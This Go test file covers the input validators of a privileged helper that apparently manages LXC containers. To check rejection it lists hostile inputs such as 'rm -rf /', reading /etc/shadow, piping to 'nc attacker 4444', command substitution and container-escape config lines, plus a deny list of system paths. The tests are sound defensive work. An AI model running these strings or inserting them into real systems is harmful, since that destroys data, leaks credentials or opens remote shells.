package helper

import (
	"strings"
	"testing"
)

// =============================================================================
// S7: Command validation tests
// =============================================================================

func TestValidateCommand_EmptyCommand(t *testing.T) {
	err := validateCommand(nil)
	if err == nil {
		t.Fatal("expected error for nil command")
	}
	if !strings.Contains(err.Error(), "empty command") {
		t.Fatalf("unexpected error: %v", err)
	}

	err = validateCommand([]string{})
	if err == nil {
		t.Fatal("expected error for empty slice command")
	}
}

func TestValidateCommand_TooManyArgs(t *testing.T) {
	cmd := make([]string, 1001)
	for i := range cmd {
		cmd[i] = "a"
	}
	err := validateCommand(cmd)
	if err == nil {
		t.Fatal("expected error for >1000 args")
	}
	if !strings.Contains(err.Error(), "too many arguments") {
		t.Fatalf("unexpected error: %v", err)
	}
}

func TestValidateCommand_NullByte(t *testing.T) {
	err := validateCommand([]string{"ls", "-la\x00/etc"})
	if err == nil {
		t.Fatal("expected error for null byte in argument")
	}
	if !strings.Contains(err.Error(), "null byte") {
		t.Fatalf("unexpected error: %v", err)
	}
}

func TestValidateCommand_ValidSingle(t *testing.T) {
	if err := validateCommand([]string{"echo", "hello"}); err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
}

func TestValidateCommand_ValidMaxArgs(t *testing.T) {
	cmd := make([]string, 1000)
	for i := range cmd {
		cmd[i] = "x"
	}
	if err := validateCommand(cmd); err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
}

// =============================================================================
// S6: Shell validation tests
// =============================================================================

func TestValidateShell_AllowedShells(t *testing.T) {
	for _, shell := range []string{"/bin/bash", "/bin/sh", "/bin/ash", "/bin/zsh"} {
		if err := validateShell(shell); err != nil {
			t.Errorf("expected %q to be allowed, got error: %v", shell, err)
		}
	}
}

func TestValidateShell_DisallowedShells(t *testing.T) {
	disallowed := []string{
		"/bin/csh",
		"/usr/bin/python3",
		"/bin/sh -c whoami",
		"/bin/sh; rm -rf /",
		"bash",
		"",
	}
	for _, shell := range disallowed {
		if err := validateShell(shell); err == nil {
			t.Errorf("expected %q to be rejected", shell)
		}
	}
}

func TestValidateShell_InjectionAttempts(t *testing.T) {
	injections := []string{
		"/bin/bash --init-file /tmp/evil",
		"/bin/sh\t-c id",
		"/bin/bash;cat /etc/shadow",
		"/bin/sh|nc attacker 4444",
		"/bin/bash&/tmp/backdoor",
	}
	for _, shell := range injections {
		if err := validateShell(shell); err == nil {
			t.Errorf("expected injection attempt %q to be rejected", shell)
		}
	}
}

// =============================================================================
// S2: pct set option validation tests
// =============================================================================

func TestValidatePctSetOption_AllowedDevOptions(t *testing.T) {
	for _, opt := range []string{"-dev0", "-dev1", "-dev9", "-dev99"} {
		if err := validatePctSetOption(opt); err != nil {
			t.Errorf("expected %q to be allowed, got error: %v", opt, err)
		}
	}
}

func TestValidatePctSetOption_AllowedMpOptions(t *testing.T) {
	for _, opt := range []string{"-mp0", "-mp1", "-mp9", "-mp99"} {
		if err := validatePctSetOption(opt); err != nil {
			t.Errorf("expected %q to be allowed, got error: %v", opt, err)
		}
	}
}

func TestValidatePctSetOption_Disallowed(t *testing.T) {
	disallowed := []string{
		"-net0",
		"-cores",
		"-memory",
		"-rootfs",
		"--delete",
		"-dev",    // no number
		"-mp",     // no number
		"dev0",    // missing dash
		"-dev100", // too many digits
	}
	for _, opt := range disallowed {
		if err := validatePctSetOption(opt); err == nil {
			t.Errorf("expected %q to be rejected", opt)
		}
	}
}

// =============================================================================
// Device path validation tests
// =============================================================================

func TestValidateDevicePath_Allowed(t *testing.T) {
	allowed := []string{
		"/dev/dri/card0",
		"/dev/dri/card1",
		"/dev/dri/render128",
		"/dev/nvidia0",
		"/dev/nvidia1",
		"/dev/nvidia",
		"/dev/nvidiactl",
		"/dev/nvidia-uvm",
		"/dev/nvidia-uvm-tools",
		"/dev/net/tun",
	}
	for _, path := range allowed {
		if err := validateDevicePath(path); err != nil {
			t.Errorf("expected %q to be allowed, got error: %v", path, err)
		}
	}
}

func TestValidateDevicePath_Disallowed(t *testing.T) {
	disallowed := []string{
		"/dev/sda",
		"/dev/sda1",
		"/dev/tty0",
		"/dev/mem",
		"/dev/kmem",
		"/etc/shadow",
		"/dev/dri/../sda",
		"/dev/random",
		"/dev/urandom",
	}
	for _, path := range disallowed {
		if err := validateDevicePath(path); err == nil {
			t.Errorf("expected %q to be rejected", path)
		}
	}
}

// =============================================================================
// Device value validation tests
// =============================================================================

func TestValidateDevValue_ValidSimple(t *testing.T) {
	if err := validateDevValue("/dev/dri/card0"); err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
}

func TestValidateDevValue_ValidWithOptions(t *testing.T) {
	if err := validateDevValue("/dev/dri/render128,gid=44,mode=0666"); err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
}

func TestValidateDevValue_InvalidGID(t *testing.T) {
	err := validateDevValue("/dev/dri/card0,gid=999")
	if err == nil {
		t.Fatal("expected error for disallowed GID")
	}
	if !strings.Contains(err.Error(), "GID 999 is not in the allowed list") {
		t.Fatalf("unexpected error: %v", err)
	}
}

func TestValidateDevValue_AllowedGIDs(t *testing.T) {
	for _, gid := range []string{"0", "44", "195"} {
		if err := validateDevValue("/dev/dri/card0,gid=" + gid); err != nil {
			t.Errorf("expected GID %s to be allowed, got error: %v", gid, err)
		}
	}
}

func TestValidateDevValue_InvalidMode(t *testing.T) {
	err := validateDevValue("/dev/nvidia0,mode=9999")
	if err == nil {
		t.Fatal("expected error for invalid mode")
	}
}

func TestValidateDevValue_EmptyValue(t *testing.T) {
	err := validateDevValue("")
	if err == nil {
		t.Fatal("expected error for empty device value")
	}
}

func TestValidateDevValue_UnknownOption(t *testing.T) {
	err := validateDevValue("/dev/nvidia0,foo=bar")
	if err == nil {
		t.Fatal("expected error for unknown device option")
	}
	if !strings.Contains(err.Error(), "unknown device option") {
		t.Fatalf("unexpected error: %v", err)
	}
}

// =============================================================================
// S5: Chown UID/GID validation tests
// =============================================================================

func TestValidateChownOwnership_AllowedPair(t *testing.T) {
	if err := validateChownOwnership(100000, 100000); err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
}

func TestValidateChownOwnership_DisallowedPairs(t *testing.T) {
	disallowed := [][2]int{
		{0, 0},         // root
		{1000, 1000},   // regular user
		{100000, 0},    // mixed
		{0, 100000},    // mixed
		{65534, 65534}, // nobody
	}
	for _, pair := range disallowed {
		if err := validateChownOwnership(pair[0], pair[1]); err == nil {
			t.Errorf("expected %d:%d to be rejected", pair[0], pair[1])
		}
	}
}

// =============================================================================
// S4: LXC config line validation tests
// =============================================================================

// newTestServer creates a minimal Server for testing conf line validation.
// Only the fields needed for validateConfLine and validateStoragePath are set.
func newTestServer() *Server {
	return &Server{
		allowedPaths: []string{"/var/lib/pve-appstore/tmp"},
	}
}

func TestValidateConfLine_AllowedKeys(t *testing.T) {
	s := newTestServer()
	allowed := []string{
		"lxc.cgroup2.devices.allow: c 195:* rwm",
		"lxc.cgroup.devices.allow: c 10:200 rwm",
		"lxc.mount.auto: proc:rw sys:ro",
		"lxc.environment: MY_VAR=hello",
		"lxc.cgroup2.cpuset.cpus: 0-3",
	}
	for _, line := range allowed {
		if err := s.validateConfLine(line); err != nil {
			t.Errorf("expected %q to be allowed, got error: %v", line, err)
		}
	}
}

func TestValidateConfLine_RejectedKeys(t *testing.T) {
	s := newTestServer()
	rejected := []string{
		"lxc.apparmor.profile: unconfined",
		"lxc.seccomp.profile: /dev/null",
		"lxc.cap.drop: ",
		"lxc.cap.keep: all",
		"lxc.rootfs: /tmp/evil",
		"lxc.idmap: u 0 100000 65536",
		"lxc.init.cmd: /bin/backdoor",
	}
	for _, line := range rejected {
		if err := s.validateConfLine(line); err == nil {
			t.Errorf("expected %q to be rejected", line)
		}
	}
}

func TestValidateConfLine_UnknownKey(t *testing.T) {
	s := newTestServer()
	err := s.validateConfLine("lxc.unknown.key: value")
	if err == nil {
		t.Fatal("expected error for unknown LXC key")
	}
	if !strings.Contains(err.Error(), "not in the allowed list") {
		t.Fatalf("unexpected error: %v", err)
	}
}

func TestValidateConfLine_EmptyAndComments(t *testing.T) {
	s := newTestServer()
	// Empty line is fine
	if err := s.validateConfLine(""); err != nil {
		t.Fatalf("empty line should be allowed, got: %v", err)
	}
	// Comment is fine
	if err := s.validateConfLine("# this is a comment"); err != nil {
		t.Fatalf("comment should be allowed, got: %v", err)
	}
}

func TestValidateConfLine_DashPrefix(t *testing.T) {
	s := newTestServer()
	err := s.validateConfLine("-delete net0")
	if err == nil {
		t.Fatal("expected error for dash-prefixed line")
	}
	if !strings.Contains(err.Error(), "must not start with '-'") {
		t.Fatalf("unexpected error: %v", err)
	}
}

func TestValidateConfLine_NoKey(t *testing.T) {
	s := newTestServer()
	err := s.validateConfLine("somegarbagelinenoequals")
	if err == nil {
		t.Fatal("expected error for line without key")
	}
}

func TestValidateConfLine_CgroupAllowAll(t *testing.T) {
	s := newTestServer()
	err := s.validateConfLine("lxc.cgroup2.devices.allow: a")
	if err == nil {
		t.Fatal("expected error for 'allow all' cgroup rule")
	}
	if !strings.Contains(err.Error(), "allow all") {
		t.Fatalf("unexpected error: %v", err)
	}
}

func TestValidateConfLine_MountAutoInvalid(t *testing.T) {
	s := newTestServer()
	err := s.validateConfLine("lxc.mount.auto: proc:rw devtmpfs:rw")
	if err == nil {
		t.Fatal("expected error for disallowed mount.auto value")
	}
}

func TestValidateConfLine_EnvironmentInvalidKey(t *testing.T) {
	s := newTestServer()
	err := s.validateConfLine("lxc.environment: 123BAD=value")
	if err == nil {
		t.Fatal("expected error for invalid environment key")
	}
}

func TestValidateConfLine_EnvironmentOverlongValue(t *testing.T) {
	s := newTestServer()
	longVal := strings.Repeat("x", 4097)
	err := s.validateConfLine("lxc.environment: KEY=" + longVal)
	if err == nil {
		t.Fatal("expected error for oversized environment value")
	}
}

func TestValidateConfLine_CpusetValid(t *testing.T) {
	s := newTestServer()
	if err := s.validateConfLine("lxc.cgroup2.cpuset.cpus: 0-3,8-11"); err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
}

func TestValidateConfLine_CpusetInvalid(t *testing.T) {
	s := newTestServer()
	err := s.validateConfLine("lxc.cgroup2.cpuset.cpus: abc")
	if err == nil {
		t.Fatal("expected error for invalid cpuset value")
	}
}

// =============================================================================
// S3: Path validation (deny list) tests
// =============================================================================

func TestCheckDenyList_BlockedPaths(t *testing.T) {
	blocked := []string{
		"/etc",
		"/etc/passwd",
		"/proc",
		"/proc/1/root",
		"/sys",
		"/sys/class/net",
		"/dev",
		"/dev/sda",
		"/root",
		"/root/.ssh",
		"/boot",
		"/boot/grub",
		"/usr",
		"/usr/bin/id",
		"/bin",
		"/sbin",
		"/lib",
		"/lib64",
		"/var/lib/pve-appstore",
		"/var/lib/pve-appstore/db",
		"/etc/pve",
		"/etc/pve/lxc",
		"/etc/pve-appstore",
	}
	for _, path := range blocked {
		if err := checkDenyList(path); err == nil {
			t.Errorf("expected %q to be blocked", path)
		}
	}
}

func TestCheckDenyList_AllowedPaths(t *testing.T) {
	allowed := []string{
		"/mnt/data",
		"/tank/backups",
		"/data/media",
		"/tmp/test",
		"/home/user",
		"/var/log/something",
	}
	for _, path := range allowed {
		if err := checkDenyList(path); err != nil {
			t.Errorf("expected %q to be allowed, got error: %v", path, err)
		}
	}
}

// =============================================================================
// Push source validation tests
// =============================================================================

func TestValidatePushSrc_NotAbsolute(t *testing.T) {
	err := validatePushSrc("relative/path.txt")
	if err == nil {
		t.Fatal("expected error for relative path")
	}
}

func TestValidatePushSrc_DisallowedPrefix(t *testing.T) {
	// /root/something is not under allowed prefixes
	err := validatePushSrc("/root/something")
	if err == nil {
		t.Fatal("expected error for disallowed prefix")
	}
}

// =============================================================================
// Perms validation tests
// =============================================================================

func TestValidatePerms_Valid(t *testing.T) {
	valid := []string{"", "0755", "0644", "755", "644", "0777", "0000"}
	for _, p := range valid {
		if err := validatePerms(p); err != nil {
			t.Errorf("expected %q to be valid, got error: %v", p, err)
		}
	}
}

func TestValidatePerms_Invalid(t *testing.T) {
	invalid := []string{"abc", "0999", "07777", "rwx", "777777"}
	for _, p := range invalid {
		if err := validatePerms(p); err == nil {
			t.Errorf("expected %q to be invalid", p)
		}
	}
}

// =============================================================================
// Validate environment (LXC config format) tests
// =============================================================================

func TestValidateEnvironment_Valid(t *testing.T) {
	if err := validateEnvironment("MY_VAR=hello"); err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if err := validateEnvironment("_PRIVATE=1"); err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
}

func TestValidateEnvironment_NoEquals(t *testing.T) {
	err := validateEnvironment("NOEQUALSSIGN")
	if err == nil {
		t.Fatal("expected error for missing = in environment")
	}
}

func TestValidateEnvironment_InvalidKey(t *testing.T) {
	err := validateEnvironment("123=value")
	if err == nil {
		t.Fatal("expected error for invalid env key starting with digit")
	}
}

// =============================================================================
// Cgroup devices allow validation tests
// =============================================================================

func TestValidateCgroupDevicesAllow_Valid(t *testing.T) {
	valid := []string{
		"c 195:* rwm",
		"c 10:200 rw",
		"b 8:0 r",
		"c 195:0 rwm",
	}
	for _, v := range valid {
		if err := validateCgroupDevicesAllow(v); err != nil {
			t.Errorf("expected %q to be valid, got error: %v", v, err)
		}
	}
}

func TestValidateCgroupDevicesAllow_AllDenied(t *testing.T) {
	err := validateCgroupDevicesAllow("a")
	if err == nil {
		t.Fatal("expected error for 'a' (allow all)")
	}
	err = validateCgroupDevicesAllow("a *:* rwm")
	if err == nil {
		t.Fatal("expected error for 'a *:* rwm' (allow all)")
	}
}

func TestValidateCgroupDevicesAllow_Invalid(t *testing.T) {
	invalid := []string{
		"x 195:* rwm",  // invalid type
		"c 195:* xyz",  // invalid perms
		"c notanumber", // bad format
	}
	for _, v := range invalid {
		if err := validateCgroupDevicesAllow(v); err == nil {
			t.Errorf("expected %q to be invalid", v)
		}
	}
}

// =============================================================================
// Mount auto validation tests
// =============================================================================

func TestValidateMountAuto_Valid(t *testing.T) {
	valid := []string{
		"proc:rw",
		"proc:ro sys:ro",
		"cgroup:rw",
		"proc:mixed sys:mixed cgroup:mixed",
	}
	for _, v := range valid {
		if err := validateMountAuto(v); err != nil {
			t.Errorf("expected %q to be valid, got error: %v", v, err)
		}
	}
}

func TestValidateMountAuto_Invalid(t *testing.T) {
	invalid := []string{
		"devtmpfs:rw",
		"proc:rw devtmpfs:rw",
		"unknown:ro",
	}
	for _, v := range invalid {
		if err := validateMountAuto(v); err == nil {
			t.Errorf("expected %q to be invalid", v)
		}
	}
}

// =============================================================================
// Cpuset validation tests
// =============================================================================

func TestValidateCpusetCpus_Valid(t *testing.T) {
	valid := []string{"0", "0-3", "0,2,4", "0-3, 8-11"}
	for _, v := range valid {
		if err := validateCpusetCpus(v); err != nil {
			t.Errorf("expected %q to be valid, got error: %v", v, err)
		}
	}
}

func TestValidateCpusetCpus_Invalid(t *testing.T) {
	invalid := []string{"abc", "0; rm -rf /", "0$(whoami)"}
	for _, v := range invalid {
		if err := validateCpusetCpus(v); err == nil {
			t.Errorf("expected %q to be invalid", v)
		}
	}
}

// =============================================================================
// Update path validation tests
// =============================================================================

func TestValidateUpdatePath_NotFound(t *testing.T) {
	// The hardcoded update binary won't exist in test environments
	err := validateUpdatePath()
	if err == nil {
		t.Skip("update binary exists in this environment; skipping negative test")
	}
	if !strings.Contains(err.Error(), "not found") {
		t.Fatalf("unexpected error: %v", err)
	}
}

// =============================================================================
// resolveNearestAncestor tests
// =============================================================================

func TestResolveNearestAncestor_RootAlwaysResolves(t *testing.T) {
	resolved, err := resolveNearestAncestor("/nonexistent/deeply/nested/path")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	// Should resolve to "/" or some existing ancestor
	if resolved == "" {
		t.Fatal("resolved to empty string")
	}
}

func TestResolveNearestAncestor_ExistingPath(t *testing.T) {
	resolved, err := resolveNearestAncestor("/tmp")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if resolved == "" {
		t.Fatal("resolved to empty string")
	}
}
